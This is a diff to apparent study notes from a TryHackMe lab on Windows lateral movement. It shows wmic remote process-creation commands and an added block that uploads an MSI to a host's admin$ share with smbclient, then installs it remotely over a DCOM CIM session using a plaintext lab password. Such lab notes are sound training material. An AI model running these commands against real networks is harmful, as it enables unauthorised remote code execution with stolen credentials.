@@ -11,3 +11,15 @@ wmic /authority:"kerberos:insomnia.io\john" /node:insomnia.io  path win32_proces
 wmic /authority:"kerberos:insomnia.io\john" /node:insomnia.io  "cmd /c ipconfig"
 wmic /authority:"Kerberos:DOMAIN REMOTE" /node:REMOTE process call create " Windows System32 nodepad.exe
 ```
+
+```
+smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/'
+PS C:\> $username = 't1_corine.waters';
+PS C:\> $password = 'Korine.1994';
+PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
+PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+```
